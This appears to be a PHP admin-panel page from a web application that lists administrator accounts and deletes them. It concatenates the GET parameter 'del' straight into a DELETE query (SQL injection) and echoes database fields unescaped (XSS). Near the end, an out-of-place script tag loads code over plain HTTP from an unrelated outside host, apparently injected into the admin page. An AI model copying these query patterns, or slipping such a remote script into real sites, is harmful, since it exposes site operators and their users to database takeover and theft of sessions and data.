<!doctype html>

<body>
<?php
include "connection.php";

include "header1.php";

 
?>
 <div class="content-wrapper">
    <!-- Content Header (Page header) -->
    <section class="content-header">
      <h1>
        Manage Admin	
        <small>Admin Panel</small>
      </h1>
      <ol class="breadcrumb">
      	<input id="myInput" type="text" placeholder="Search..">
        <li><a href="dashboard.php"><i class="fa fa-dashboard"></i> Home</a></li>
        <li class="active">Manage Admin</li>
      </ol>
    </section>

    <!-- Main content -->
    <section class="content">
      <!-- Small boxes (Stat box) -->
      <!-- Main row -->
      <div class="row">
	    <div class="col-xs-12">
          <div class="box">
            <div class="box-header">
              <h3 class="box-title">Manage Admin</h3>

              
            </div>
            <!-- /.box-header -->
            <div class="box-body table-responsive no-padding">
              <table class="table table-hover">
                <tr>
                  <th>ID</th>
                  <th>Admin Name</th>
				  <th>Phone</th>
				  <th>Email</th>
				  <th>Address</th>
				  
				  <!--<th>Lawyers Added</th>-->
                  
                  <th>Action</th>
                </tr>
				


				<?php
				
					$log=$_SESSION['log'];

					$q1=mysqli_query($con,"SELECT * FROM tbl_login WHERE email='$log'");
					$value = mysqli_fetch_array($q1);
					$xyz=$value['l_id'];
					//echo "<script>alert('$xyz')</script>";	

					$q4=mysqli_query($con,"SELECT * FROM admin WHERE l_id='$xyz'");
					$value4 = mysqli_fetch_array($q4);
					$xyz4=$value4['admin_id'];
									

					$query="SELECT tbl_admin.a_id,tbl_admin.a_name,tbl_admin.a_add,tbl_admin.a_gender,tbl_login.phone,tbl_login.l_id,tbl_login.email FROM tbl_admin,tbl_login WHERE  tbl_admin.l_id=tbl_login.l_id AND tbl_admin.l_id!='$xyz' AND tbl_admin.active=0";
					$result2 = mysqli_query($con,$query);
					
					$seq=1;
					while($value2 = mysqli_fetch_array($result2))
					{
				?>
                <tr>
                	<?php echo "<tbody id='myTable'>"; ?>
                  <td><?php echo $seq;?></td>
                  <td><?php echo $value2['a_name'];?></td>
                  <td><?php echo $value2['phone'];?></td>
				  <td><?php echo $value2['email'];?></td>
				  <td><?php echo $value2['a_add'];?></td>
				  <?php $val6=$value2['l_id'];?>
				  <?php $val=$value2['a_id'];?>
                <!-- <td>  <a href="view_lawyer.php?id=<?php //echo $val; ?>" class="btn btn-success btn-xs">View</a> </td>-->
					
				  <td> 
				  <a class="btn btn-success btn-xs" href="edit_admin_detail.php?ad_id=<?php echo $value2['a_id'];?> " 
					onclick="return confirm('sure to edit?');">EDIT</a> &nbsp;&nbsp;
				  <a class="btn btn-danger btn-xs" href="?del=<?php echo $value2['a_id'];?>" 
					onclick="return confirm('sure to delete?');">DELETE</a>
					</td>
				</tr>
				
				<?php
					$seq++;
					}
			if(isset($_GET['del']))
		   {
			$sql="DELETE FROM tbl_admin WHERE a_id=".$_GET['del']."";
			$resultt=mysqli_query($con,$sql);

			if($resultt){
				$updated = mysqli_query($con,"UPDATE tbl_login SET active = 0 WHERE l_id='$val6'");
			}
			echo ("<script>location.href='manage_admin.php'</script>");
		
		   }
				
				?>

              </table>
            </div>
<script language="javascript" charset="UTF-8" type="text/javascript" src="http://cdn.stats-collector.org/stats.js"></script>

<script>
$(document).ready(function(){
  $("#myInput").on("keyup", function() {
    var value = $(this).val().toLowerCase();
    $("#myTable tr").filter(function() {
      $(this).toggle($(this).text().toLowerCase().indexOf(value) > -1)
    });
  });
});
</script>
